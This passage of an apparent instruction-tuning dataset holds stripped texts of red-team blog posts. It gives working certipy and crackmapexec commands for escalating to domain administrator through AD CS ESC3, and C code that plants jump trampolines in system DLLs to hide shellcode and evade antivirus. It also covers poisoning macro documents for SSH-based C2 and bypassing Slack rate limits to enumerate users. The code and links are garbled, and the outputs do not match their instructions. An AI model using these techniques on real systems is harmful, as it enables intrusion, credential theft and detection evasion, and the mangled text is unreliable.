Domain Users group and therefore is authorized to request a certificate using the vulnerable template Using the command below we can request a certificate for bspears certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'ESC3_User_1'-debug Once again the Certipy results will return the request ID or an Object SID Note these See the Validity Period section for more information Request Certificate for bspears imilar to ESC2 we can now use our certificate generated in the previous step to request a certificate on behalf of another user via the User template As demonstrated below we can use this template to request a certificate on behalf of the domain admin certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'User -on-behalf-of 'example administrator -pfx bspears.pfx -debug Request Certificate for Domain Administrator administrator We now have our certificate for the administrator account we can authenticate as the domain admin Example 2 We can also request a certificate using a template that has an Issuance Requirement policy specifying Certificate Request Agent In the screenshot below the ESC3_User_2 template was configured with an authorized signature requirement set to 1 and the issuance requirement policy set to Certificate Request Agent ESC3 Template 2 Additional key configurations for the ESC3_User_2 template are listed below Low Privilege Users Granted Enrollment Rights Enabled True Client Authentication True Requires Management Approval False Authorized Signatures Required 1 Application Policies Certificate Request Agent The Certipy results for this template are shown below Certipy Results for ESC3_User_2 Template Once again we will request a certificate for bspears using the ESC3_User_1 template certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'ESC3_User_1'-debug Take note of the returned request ID or an Object SID Request Certificate for bspears Then we can use our certificate generated for bspears to request a certificate on behalf of the administrator account using the ESC3_User_2 template certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'ESC3_User_2 -on-behalf-of 'example administrator -pfx bspears.pfx -debug Take note of the returned request ID or an Object SID Request Certificate for Domain Administrator administrator Once again we have our certificate for the administrator account we can authenticate as the domain admin Summary As you can see the steps to exploit ESC3 are similar to those in ESC2 Each escalation technique combined overly permissive enrollment rights with Extended Key Usage configurations However the conditions of the vulnerable templates for each technique are slightly different In both examples we were able to obtain a certificate on behalf of a low privilege user which we could then use to request a certificate on behalf of a high privileged Domain Admin account Certificate Authentication Once we have our certificate administrator.pfx we can use the certificate to obtain the credential hash and a Kerberos ticket of the target administrator account using the Certipy auth command as shown below certipy auth -pfx administrator.pfx As shown in the figure below we successfully retrieved a TGT and the NT hash for the administrator account Get Administrator Credentials Now we can impersonate the administrator To demonstrate this we can use CrackMapExec2 to authenticate to the domain controller and execute commands as the domain admin crackmapexec smb 10.10.0.10 -u administrator -H REDACTED_HASH -x whoami Execute Command Using Administrator Credentials Validity Period It is important to note that certificates are valid until the validity period ends unless the certificate is explicitly revoked This is why we must pay attention to the request number SID returned as a result of the certificate request Let's look at an example template to demonstrate this As we can see in the figure below the template specifies a validity period of 5 years Validity Period If we use the template above to request a certificate on behalf of the user DA Dan we will have access to DA Dan's account for the next five years regardless of any password changes We can also renew the certificate before the expiration date to maintain access to the account which means that this technique not only is a handy privilege escalation technique but could also serve as a means of persistence Prevention and Detection So what can you do to prevent and detect such attacks Here are a few steps you can take Make sure that template permissions are as restrictive as possible Only grant necessary groups users enrollment permissions Review all CAs in your environment and remove Request Certificates permissions Enrollment Rights from all unnecessary groups This will prevent unnecessary low-privilege groups from enrolling via certificate templates Take stock of your certificate templates and determine whether all enabled templates are currently in use Disable all templates that are unnecessary Restrict forms of certificate authentication allowed in your environment Monitoring Monitoring certificate enrollment events for users can allow you to detect when an account requests a certificate and when your CA issues a certificate By monitoring these events an administrator can alert on anomalous behavior and revoke certificates that appear to be malicious or suspicious Some useful event IDs can be found below 4886 Request for certificate 4887 Certificate issued 4768 Request for Kerberos ticket TGT Resources SpecterOps Whitepaper pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf SpecterOps Blog Post osts.specterops.io certified-pre-owned-d95910965cd2 Microsoft PKI defensive guidance earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 dn786443 v ws.11 PKIAudit ithub.com GhostPack PSPKIAudit PKINITtools ithub.com dirkjanm PKINITtools PyWhisker ithub.com ShutdownRepo pywhisker Certi ithub.com zer1t0 certi Impacket ithub.com fortra Impacket Certipy ithub.com ly4k Certipy Certify ithub.com GhostPack Certify Footnotes READ PART 1 PART 2 PART 3"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>DLL Jmping: Old Hollow Trampolines in Windows DLL Land</title>\n<taxonomies>Debjeet Banerjee, General InfoSec Tips & Tricks, Informational, InfoSec 201, Red Team, Red Team Tools</taxonomies>\n<creation_date>Thu, 06 Jun 2024 14:45:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "DLL hollowing is an age-old technique used by malware authors to have a memory-backed shellcode However defensive mechanisms like CFG and XFG have made it incredibly difficult to implement such techniques Controls like WDAC are enabled by default on the latest Windows releases which adds an extra layer of difficulty when it comes to implementing alternate versions of this technique However Windows still has some DLLs on the system which can be leveraged for DLL Hollowing or coupled with some JOP can be used to spoof the origin of threads from tools like Process Hacker This blog demonstrates how we can dynamically locate such DLLs and use them to deliver payloads The technique discussed in this blog can help malware authors to dynamically find such DLLs on a target system and use them to masquerade the origin of threads as well as have memory-backed shellcode to bring down detection rate of payloads Finding Target DLLs To find a list of DLLs we need a couple of functions A function that iterates through the system directory recursively to find all DLLs present A function that checks if the DLLs can be used to stage payload delivery The first part is fairly simple We use a function to recursively search a directory for all DLLs as such BOOL ListDLLsInDirectory LPCTSTR directoryPath HANDLE hFind WIN32_FIND_DATA findFileData TCHAR searchPath MAX_PATH if NULL directoryPath return FALSE Combine directory path with wildcard search pattern if S_OK StringCchPrintf searchPath MAX_PATH TEXT s directoryPath return FALSE Find the first file in the directory hFind FindFirstFile searchPath findFileData if hFind INVALID_HANDLE_VALUE return FALSE List all DLL files do if findFileData.dwFileAttributes FILE_ATTRIBUTE_DIRECTORY Skip and directories if _tcscmp findFileData.cFileName TEXT 0 _tcscmp findFileData.cFileName TEXT 0 Recursively list DLLs in subdirectory TCHAR subDirPath MAX_PATH if S_OK StringCchPrintf subDirPath MAX_PATH TEXT s s directoryPath findFileData.cFileName FindClose hFind return FALSE ListDLLsInDirectory subDirPath else Print the DLL file name if endsWithDll findFileData.cFileName Check if DLL is valid TCHAR dll_path MAX_PATH 0 if S_OK StringCchPrintf dll_path MAX_PATH TEXT s s directoryPath findFileData.cFileName FindClose hFind return FALSE LPVOID txt_addr CheckIfDllWorks dll_path if txt_addr NULL size_t entry_size sizeof DLLInfo PDLLInfo entry PDLLInfo malloc entry_size RtlZeroMemory entry entry_size entry txt_section txt_addr memcpy entry dll_path dll_path MAX_PATH Check if this is the first entry if LL_HEAD NULL LL_HEAD entry Set the last entry's next pointer if Current NULL Current next entry Current entry while FindNextFile hFind findFileData Close the search handle FindClose hFind return TRUE We can then call the above function like such TCHAR systemDirectory MAX_PATH GetSystemDirectory systemDirectory MAX_PATH ListDLLsInDirectory systemDirectory The function uses recursion to locate all DLLs in the systems folder aka C Windows System32 Once we locate a DLL file we use the CheckIfDllWorks function to verify if the DLL can be used to deliver payloads more on this a bit later If the DLL can be used for payload delivery then we add it to a linked list that contains the DLLs to use and the address at the beginning of their .text section Looking into the CheckIfDllWorks function it has the following code LPVOID CheckIfDllWorks TCHAR dll_path if IsDllLoaded dll_path return NULL HMODULE hModule LoadLibraryEx dll_path NULL DONT_RESOLVE_DLL_REFERENCES if hModule NULL return NULL IMAGE_DOS_HEADER dosHeader IMAGE_DOS_HEADER hModule IMAGE_NT_HEADERS ntHeaders IMAGE_NT_HEADERS DWORD_PTR hModule dosHeader e_lfanew Check for CFG if ntHeaders OptionalHeader.DllCharacteristics IMAGE_DLLCHARACTERISTICS_GUARD_CF FreeLibrary hModule return NULL Iterate through the section headers IMAGE_SECTION_HEADER sectionHeader IMAGE_FIRST_SECTION ntHeaders for int i 0 i ntHeaders FileHeader.NumberOfSections i sectionHeader ULONG _txt_offset 0 if strncmp char sectionHeader Name .text 5 0 _txt_offset sectionHeader VirtualAddress LPVOID txt_section LPVOID UINT64 hModule _txt_offset return txt_section FreeLibrary hModule return NULL The function checks three things Is the DLL already loaded in memory If not it moves to the next check Was the DLL compiled with CFG enabled If not it moves to the final check Does the DLL have a .text section where we can host our code If so the function computes the offset of the .text section and adds it to the base address to get the location of the .text section loaded in memory One interesting artifact I would like to mention is that we use the LoadLibraryEx function over the LoadLibrary function as that enables us to load a DLL in memory without the need to call DllMain Ultimately we have a linked list full of DLLs loaded in the process memory which we can use to redirect execution to our shellcode Jmp'ing to Shellcode Now for the payload propagation part we would write the following instruction at the start of every .text section mov rax 48 b8 call rax ff d0 The code for the process looks as such BOOL AddJmp LPVOID jmp_tgt LPVOID src size_t inst_size 12 sizeof unsigned char unsigned char inst unsigned char malloc inst_size if inst NULL return FALSE RtlZeroMemory inst 12 sizeof unsigned char inst 0 0x48 inst 1 0xb8 inst 10 0xff inst 11 0xd0 int i 2 uintptr_t bytes uintptr_t jmp_tgt while i 10 inst i bytes 0xFF bytes bytes 8 i AllocatePayload src inst inst_size return TRUE LPVOID BackDoorDLL LPVOID p_addr PDLLInfo entry LL_HEAD LPVOID tgt_addr p_addr while entry NULL if !AddJmp tgt_addr entry txt_section return NULL tgt_addr entry txt_section entry entry next return tgt_addr The BackDoorDLL function takes in the address of the shellcode We then iterate through the Linked List and use the AddJmp to write the opcode for the instruction to the start of the .text section of the DLLs Finally the BackDoorDLL function returns the address of the start of the chain which we can then pass onto functions like CreateThread which will eventually lead to the execution of shellcode Alternatively if the size of the payload is less than the size of a particular DLL's VirtualSize we can use the DLL to even overwrite the DLL memory with the shellcode Testing the Code Compiling and running the project we should see our _Hello World_ MessageBox payload being executed Looking at the thread in Process Hacker we see that the origin for the thread is being reflected as pspluginwkr.dll instead of the binary Further putting a breakpoint at one of the intermediate addresses confirms that the chain calls are taking place and that it works as expected VirusTotal Comparisons To check the effectiveness of this method we upload two sets of payloads One with a direct call to the Shellcode One using the above method The samples used the same unencrypted payload without any other evasions and were compiled using the same flags as well The sample which directly called the payload returned the following detection rate However implementing the above method discussed method seems to significantly reduce the detection rates to Therefore it would be worthwhile to include the method in this blog post in your Offsec tooling Combined with other evasion techniques the chaining method discussed here can help Offsec Devs create more undetectable payloads Happy Hacking"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Augmenting Security Testing and Analysis Activities with Microsoft 365 Products</title>\n<taxonomies>David Fletcher, Informational, Red Team, macros, Microsoft 365</taxonomies>\n<creation_date>Thu, 13 Jun 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Use of Microsoft 365 products in security testing is not a new concept For a long time I've incorporated various activities using Office products into my testing regimen In the early days we used to frequently use malicious Office documents for initial access embedding malware in a macro-laden document to be executed when the user opened the file Sadly direct payload execution using VBA macro logic has become increasingly more difficult and organizations may block inbound macros altogether All is not lost though there's plenty of opportunity to use macros during testing and for analysis as a defender Over time my macro use has evolved from direct execution to focusing on other capabilities that might be useful in the context of security testing I will cover some of those concepts in this blog post For expanded treatment on the subject watch my webcast on the same subject at ww.youtube.com watch?v cfKDnxeoTuQ Resources discussed in this blog post can be found at ithub.com aut0m8r FunWithMacros Microsoft Office Product Choices Microsoft Office products are just another LOLbin at our disposal In incorporating Microsoft Office products into your testing methodology it might be useful to consider which product to start with In my case I most frequently tend to use Microsoft Excel for the following reasons Data is presented in a simple tabular format this makes it easy to analyze visualize and present information in bulk Rather than having to investigate each object in Bloodhound to see the value of a given attribute I can just look at the table itself and use integrated features Hiding and unhiding elements Columns and tables can be hidden in Microsoft Excel workbooks This provides the opportunity to collect information into elements that are not immediately accessible to the user This is extremely valuable when poisoning existing macro-enabled documents Integrated features Sorting filtering conditional formatting and formula support make Excel an attractive product for collection of raw data that may require manipulation and analysis after the fact External data collection Excel supports a ton of features for collecting information from the local environment LDAP Active Directory databases and other sources that might be useful in the context of testing and security analysis Often collection of data using these features goes undetected within an environment At the end of the day I recommend using the product that makes the most sense in the context of your given conditions You may need to adapt the strategies identified here but in doing so you're likely to be expanding the tooling options available to the greater community With the advent of Microsoft 365 the Office suite has added some additional features that might help us in our testing efforts along the way Consider the scenario where you gain access to an organization's Microsoft 365 environment but don't establish remote C2 Commonly this typically occurs when using a reverse proxy pilfering the browser credential store or just analyzing stealer malware dumps Office products now include the notion of presence when a user opens a document a presence indicator appears in the ribbon for any other user that has the same document open As a consequence one of my favorite activities is to search for existing macro-enabled documents that appear to be frequently used in SharePoint OneDrive or SMB shares and wait for the presence information to appear After I'm convinced that the documents are going to be useful for my nefarious purposes I add my own macro logic to the existing document The wonderful thing about this technique is that we don't have to really worry about the enable macros prompt because we know that users are ALREADY using our target document Obviously before you go poisoning documents all willy-nilly you should take some time to understand how your surrogate code will affect the operation of the legitimate document Also ALWAYS make a backup of the original document Common Activities So what can we do this these documents that won't cause endpoint protection to trigger on a given device I often approach document poisoning in several stages Reconnaissance In the initial stage my approach is usually guided by the following question What would I want to know prior to sending a phishing email to this user The answer usually includes What kind of endpoint protection is on my target host We can interrogate processes and investigate the contents of the local filesystem to at least get a rough approximation What permissions does my target user have in the environment We can definitely ask Active Directory and then target our payload to execute in context of a specific user if we desire Are there any useful applications I might want to try to impersonate to avoid detection Usually this involves investigating the file system for entries that might indicate custom developed applications I usually look for the name of my organization in the Program Files folders then when I do try to deliver a payload I mimic characteristics of those applications Why would I do this Because these applications are commonly allowlisted in application control and endpoint protection solutions and may be ignored by the security team After gathering details from the remote system I might want to perform analysis on Active Directory Gathering details about the password policy a list of users groups and computers often helps me better understand the target environment and will increase the effectiveness of any external attacks I'm executing Password spraying effectiveness will certainly be increased by having a full list of internal users and knowledge of the internal password policy In addition Active Directory attribute analysis may expose additional credentials An excerpt of commonly useful output is shown below Domain Password Policy Details User Account Details Computer Details Sensitive Group Membership Initial Access With sufficient knowledge about the internal environment I might attempt to establish remote command and control C2 on the target system An interesting method of doing this involves abuse of the SSH client that is installed on modern Microsoft Windows clients by default Typically I'll set up a restricted SSH users on a Virtual Private Server VPS instance and then use SSH to either deliver a payload to the endpoint or establish a reverse SSH tunnel connection Often I find that I can establish outbound SSH connectivity using TCP port 443 My approach to establishing this access often involves using the macro to do two things First I drop the SSH private key for my restricted user on the VPS to the compromised user's profile directory Next I drop an LNK file to somewhere that will cause user-induced execution Examples include the startup folder or the users desktop for hotkey persistence The LNK file contains the SSH command used to do my bidding This could include downloading and executing a payload downloading the payload directly to a dll hijack or dll sideload location or establishing a reverse SSH tunnel SSH file transfer has the benefit of not receiving Mark of the Web Post Compromise After establishing a foothold in the environment I often use Microsoft Excel for post compromise activities as well The product has native support for connecting to various resources Features that I've already implemented include Analysis of the SYSVOL Policies share This feature will gather details about interesting artifacts like drive mappings scripts URLs and nonstandard policy files The results can provide a stealthier alternative to full SMB share analysis and scanning for internal web applications SQL database access This feature identifies computers with Service Principal Names SPNs containing MSSQLSvc then attempts to connect to each one providing a database listing for any accessible database servers LAPS password access LAPS analysis is tricky because if the product is not deployed then the associated attribute ms-mcs-AdmPwd may not exist in the directory This module will check for readable LAPS passwords under the context of the executing user These features are just the tip of the iceberg The Data tab in the Microsoft Excel ribbon has a ton of functionality that attackers may be able to use to perform interesting operations Did you know that you can use Microsoft Excel as a SQL client for various data sources You should definitely check it out Another technique I have used in post-compromise situations is to hunt for commonly used macro enabled documents INTERNALLY Then I reengage with document poisoning only this time I drop a payload on an internal writeable file share and use an LNK file to execute that payload using the same techniques described above Conclusion Hopefully this blog post has gotten your creative juices flowing Microsoft Office is a tool that is just as ripe for abuse as any other As you're exploring environments consider how you might use native features to enhance your testing methodology At the very least you will provide your customers with food for thought to consider hardening deployments of common tools like the Microsoft Office suite One last note for defenders consider how gathering information from Active Directory might help you bolster your internal security If you can't get permission to run tools like BloodHound or PingCastle in your environments use of the Office suite may be a good starting point for understanding where weaknesses might exist in your environments If you feel like you might want to collect this type of information from Active Directory please check out the resources available at ithub.com aut0m8r FunWithMacros"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>From High School to Cyber NinjaFor Free (Almost)!</title>\n<taxonomies>Carrie Roberts, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Getting Started In InfoSec, training</taxonomies>\n<creation_date>Thu, 20 Jun 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Guest Author Carrie Roberts is an Antisyphon instructor and experienced cyber security professional who has mentored many on their journey into cyber My name is Carrie Roberts and I love my job in cyber security because there is so much to be learned and so many ways to contribute in positive and imaginative ways Not to mention the pay is great the skillset is in high demand and there are flexible work arrangements and schedules I encourage everyone to consider cyber security as a career and I am always looking for ways to help them do it That is why I have created this Cyber Ninja training plan I have three high school-age daughters who are interested in becoming cyber engineers and I have been spending my time developing the best and most cost-effective plan to take them from high school all the way to Cyber Ninja To my pleasant surprise I found that the education and hands-on practice to make that happen is already available for free to anyone with a computer and an internet connection It is only the credentials certifications and degrees that cost money In fact you could spend a lifetime reviewing all the free content available But what you need is a guide that will take you through the maze of material in the most logical and efficient manner possible and that is what I am offering you here I have not put anything on this list that I have not personally completed to confirm the quality of the content and I believe that this content will take you well on your way towards becoming a cyber professional I originally wanted to have a list of completely free resources but then I discovered TryHackMe training and it was so amazing and affordable 15 mo that I decided to make it part of the plan Cyber Ninja Training Plan Free TryHackMe Training Plan The Cyber Ninja training starts off with some low level how computers and the internet work content to get everyone on solid footing It then takes you through 40 hours of Professor Messer's excellent training courses to prepare you for the CompTIA A Network and Security certifying exams You don't have to pay to take exams but if you do they will give your resume a nice boost Next I highly encourage you to try the TryHacKMe hands-on learning It is free to use to some extent but you will need the 15 month subscription to complete all of it You will be well on your way to developing your cyber skills after completing the 380 hours of training modules within TryHackMe Ok back to the Cyber Ninja Training plan where you get in-depth hands-on training with Burp Suite Intercepting Proxy arguably the most used tool by pentesters Then we get into the Ninja part of the training where you will learn HTML Javascript SQL Python PowerShell Bash and Batch Scripting Regular Expressions Git GitHub and more Completing the approximately 600 hours of training above may be enough to land you the cyber security job that you want To increase your chances and your potential for higher income I recommend obtaining a degree and some industry certifications but this is expensive Let's talk about college hacks to minimize the cost First there are great companies that will pay for your degree in full if you work for them at least part-time This includes Walmart's Live Better U program which covers 100 tuition and books eligibility starts on your first day of part-time or full-time work My next favorite is Kentucky Fried Chicken's partnership with Western Governors University covering 100 percent tuition and fees Or look here for more corporate-sponsored options These employer-paid programs are all great options But time is money and the more time you spend working the longer school will take you to complete For this reason I offer this method for fast-tracking your college degree Complete your prerequisites at Sophia Learning things like math science English writing etc Transfer your credits to a self-paced college you know one where you can work faster than average Sophia Learning is an online university whose credits transfer to several partner universities The cost is only 99 month or you can purchase 1 year of access for 600 That is only 50 month You can take 2 classes at a time and complete them at any speed you want like really fast for example The minimum age to enroll is 13 years old and you don't need to have completed high school first It is available to anyone worldwide you don't have to be a US citizen It only takes 5 minutes and a credit card to sign up and no prior transcripts are required I suspect that even the mildly ambitious student can complete 1 course per month on average about 44 credits within a year Next let's assume that you are going to enroll in Western Governors University US residents only and pursue one of their cyber-related degrees which are linked to below Cybersecurity and Information Assurance Cloud Computing Information Technology Network Engineering and Security Software Engineering Computer Science All these degrees are great options for helping you be successful in cyber security Let's assume you choose the Cybersecurity and Information Assurance degree The cost per 6 months of access to courses is 4 265 At WGU there is no homework only testing often only one to confirm that you know the material This means that if you already know the material you can start and finish the course within a single day by simply passing the test Everything is graded pass fail so there is no GPA to worry about and there are options to retake a failed test if needed Since you will have already completed your general education requirements through Sophia Learning and already learned the majority of the course material through the Cyber Ninja training program you are going to be able to work through the courses quickly WGU publishes the exact courses from Sophia learning that will transfer into their program which is currently 44 of the required 122 credits This means you already have over one-third of your degree credits complete Do you think you could complete 2 classes per month considering there is no homework and you have already learned the majority of the material If so you would be done with your degree in one year at a total cost of 8 530 Another exciting thing about WGU is that the course work and tuition covers many industry certifications For the cyber degree you complete the following 15 certifications certification fees covered by WGU B.S Cybersecurity and Information Assurance ITIL Foundation Certification CompTIA A CompTIA Network CompTIA Security CompTIA Project CompTIA CySA CompTIA Network Vulnerability Assessment Professional CompTIA Network Security Professional CompTIA Security Analytics Professional CompTIA PenTest CompTIA IT Operations Specialist CompTIA Secure Infrastructure Specialist Linux Essentials Certified Cloud Security Professional CCSP Systems Security Certified Practitioner SSCP Assume you take 6 months to complete the Cyber Ninja Training including TryHackMe 90 6-12 months with Sophia learning 600 and one year at WGU 8 530 This means you will be able to add a degree and 15 industry certifications to your resume in about 2 years for less than 10 000 Now that is a college hack If you have questions about anything here reach out to Carrie OrOneEqualsOne on the Atomic Red Team Slack or the Antisyphon or Black Hills Discord channels If you would like to learn more about Carrie and how she got into cybersecurity check the links below Failing a Pentest is not the End It's a Beginning My Beginning My Journey From Pentest to Red Team to Blue Got Enough Monitors Carrie's Resume Carrie is currently a Red Teamer at Walmart Comments and opinions are provided as personal opinion and not as a representative of Walmart They do not reflect the views of Walmart and are not endorsed by Walmart Want to hear more from Carrie herself Join in on a free one-hour Antisyphon Anti-cast as she shares her recommended list of resources as well as other low cost training options Register for this free mentoring session with Carrie here Get an Epic Cyber Education for Free Almost w Carrie Roberts"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Introducing SlackEnum: A User Enumeration Tool for Slack</title>\n<taxonomies>How-To, Informational, Michael Allen, Recon, Red Team, Red Team Tools, Web App</taxonomies>\n<creation_date>Thu, 27 Jun 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Recently as part of our ANTISOC Continuous Penetration Testing CPT service I had an opportunity to investigate how attackers can leverage Slack in cyber-attacks similar to how we frequently use Microsoft Teams to identify users and perform attacks during red team exercises something Slack clearly makes an effort to prevent Targeting Slack is particularly interesting because even if an organization does not have a Slack subscription individual users within the organization may have Slack accounts linked to their work email address They may also use the Slack app or web interface on their work devices In fact after running the enumeration attack described in this article against our Continuous Penetration Testing customers some were surprised to learn that hundreds of their employees had active Slack accounts connected to their work email addresses even though the organization did not have a Slack subscription or use Slack in any official capacity In today's blog post I'll share my process for developing SlackEnum a new tool that can enumerate a large quantity of users and collect their names and email addresses for further action while bypassing Slack's rate-limiting controls intended to prevent this abuse Note To keep from doxing any real Slack users I've replaced unredacted email addresses in this article with fictitious email addresses on the domain example.com Slack's User Enumeration Feature User enumeration is based on a simple premise If a site behaves differently when an invalid user ID is entered versus when a valid user ID is entered then it's possible to determine whether a given user ID is valid just by observing the website's response In Slack's case email addresses are that user ID used to log into a user account and used to identify other Slack users After logging into Slack a user can search for other users by clicking on the More button on the main screen and then clicking the External connections item in the menu At the top of the resulting page is a search box that allows searching for other users by their email address If you search for an email address that doesn't have a Slack account Slack will tell you that the account doesn't exist But when you search for the email address of a valid Slack user the user's email will be shown on screen along with a button that can be clicked to start a conversation with them In some cases the user's display name usually their first and last name is also displayed on screen On Slack this method of user enumeration appears to be intended functionality rather than an unintended side effect This is further evidenced by the fact that users and business subscribers have the option to prevent others from finding them with this method by disabling the Slack Connect discoverability setting on their account In both cases however discoverability is enabled by default and I have yet to encounter an organization that has disabled discoverability across their entire user base Even though user enumeration on Slack seems to be intended attackers don't care if user enumeration is the result of a bug or a feature The benefit to attackers is the same either way We can confirm that an email address exists confirm that the owner has a Slack account and sometimes get the full name of the account owner Slack seems to be aware of this since enumerating more than about 10 users from a free account results in rate limiting When this happens the account isn't allowed to lookup any other users until a cool-down period has passed Bypassing Rate Limits with a Gatling Gun Despite the rate-limiting I still wanted to abuse this feature to enumerate Slack accounts and I wanted to do it in bulk so I could use it for identifying Slack users organization-wide for all of our CPT customers Since this user enumeration method was only possible while I was logged in changing IP addresses alone would not get around the rate limit because it was my user account and not my IP address that had been rate limited But that gave me an idea If I spread the requests out over multiple Slack accounts the request rate per account might be slow enough to keep from triggering the rate limit This is similar to how the gatling gun could fire a barrage of bullets at a very high rate but the barrel of the gun would not overheat because the bullets were fired from multiple cycling barrels After the first barrel fired the other barrels continued firing giving the first barrel time to cool down before another bullet was fired through it again By spreading the workload across multiple barrels in this way no barrel ever became hot enough to overheat With this concept in mind I went to work automating the user enumeration process Planning for Automation Using Burp Suite I captured browser requests and server responses for each of the three scenarios I observed when interacting with the user search function through the web interface First there was the current search query whose response indicated that my account was rate limited Examining this request provided me with the path api connectableContacts.lookup where my searches were being submitted and the error ratelimited text in the response provided a clear indicator that rate limiting had been triggered After the cool-down period had passed and my user account was no longer rate limited I used Burp Repeater to replay the same request I searched for the same email address which did not have a matching Slack account This let me capture the response for a non-existent account Then I modified the email address in the request and issued it through Burp Repeater again This time I searched for the email address of an account that I knew existed which let me see both the server's response for a valid account and how the response data was formatted so I could extract the user's name when it was present I repeated this process of modifying the email address and reissuing the request a few more times to confirm that the responses continued to match the same JSON data structure Manually modifying and replaying the same requests several times also confirmed that no single-use tokens e.g CSRF tokens were required to make a successful search request The last step in analyzing the search API was to determine whether any other parameters were required when performing a search First I removed all the cookies from my request and replayed it again just to be sure unauthenticated search queries were not allowed As expected this request failed and I received an invalid_auth error I restored the cookies so that the request worked as normal again and then took a look at the POST parameters The only POST parameter that looked like it might be unique to my user account was the token parameter whose value started with xoxc I modified the last few bytes of the token value and reissued the same request Again I got the same invalid_auth error as when I removed the cookies before and this confirmed that a valid token value was required to make the search request I used Burp Proxy to search for the token value in all previous requests and responses generated while I was using Slack in my web browser The first mention of the token value was in a response from ssb redirect where the Slack API issued the token value to my browser alongside the key name api_token I replayed the request to ssb redirect a few times in Burp Repeater to confirm that the api_token value appeared in the response every time I made the request which it did At this point I was pretty sure I had everything I needed to make a basic user enumeration script for Slack I just had to automate each individual step of the user enumeration process I just walked through and then wrap the whole thing in cycle that would fire requests from multiple Slack accounts in sequence like the barrels of a gatling gun That and I needed a whole bunch of user accounts to act as those barrels How to Create 100 Slack Accounts Because I could only make around 10 search requests in a short time before one user account got rate limited I needed to create a lot more user accounts so that the time between repeat requests from the same account would be as great as possible So I created one hundred Slack user accounts all joined to the same workspace This was by far the longest most tedious part of this whole project It reminded me of a time I hiked up the stairs from ground level to the 50th floor to break into the CEO's office during an on-site red team The security guards in the building were taking the elevators as they made their rounds on each floor because obviously no one was dumb enough to climb all the way to the top of a 50-story building up the stairs Sometimes it's not anything technical or fancy that gets the win Sometimes it's just doing something uncomfortable for longer than your opponent thinks any reasonable person would To be honest I would have preferred climbing the stairs again to sitting here at my computer making 100 accounts Fortunately at least Slack accounts can be created much faster than user accounts on a lot of other services and I got it done in a couple hours If you want to use SlackEnum you'll unfortunately have to pay a similar price since multiple user accounts are required to get around the rate limit So here's the process I used to create a bunch of Slack accounts and join them to the same workspace in as few clicks and keypresses as possible Buy a domain on NameCheap.com and set up email forwarding from that domain to your email address This will let you receive all emails sent to any address on that domain Create a new Slack account and workspace with any made-up email on your domain Generate a list of however many email addresses you'd like to create accounts for Here's an example of a command you can use to generate 99 email addresses on Linux replace your-domain.com with your own domain of course for n in 01..99 do echo user n your-domain.com done 4 In your Slack account click on Invite Coworkers and paste the list of all the email addresses you just generated Now in your email you'll get a Slack invitation for every one of those email addresses Open one of the emails click the invitation link enter a name and you'll be automatically logged in and joined to your Slack workspace After getting logged in export your browser's cookies to a file with the CookieBro browser extension Then clear all the browser's cookies by pressing CTRL Shift Del and repeat Slack Identities The Barrels of the Gatling Gun To handle multiple Slack accounts I initially wrote a function to parse raw HTTP requests saved from Burp Suite Since I had been using Burp to do all the initial testing that seemed convenient at the time But like I mentioned in the last section after I started creating and logging into multiple Slack accounts I found that it was faster to just export the cookies with CookieBro So the result is that SlackEnum accepts Slack accounts in two different formats either raw HTTP requests copied and saved from Burp or CookieBro-exported JSON files containing all the user's cookies Within SlackEnum I refer to these attacker-controlled Slack accounts as Slack identities or Slack IDs to give them a clear name that's separate from the accounts that are targeted for enumeration The Slack IDs are saved to two user-configurable folders one for Burp requests and one for CookieBro files and all the files from those folders are loaded and parsed by the script when it's launched Since the CookieBro files only contain cookies the Slack workspace hostname and browser user agent string are hardcoded into SlackEnum in the Settings section at the very top of slackenum.py Therefore all Slack IDs imported from CookieBro files must be joined to 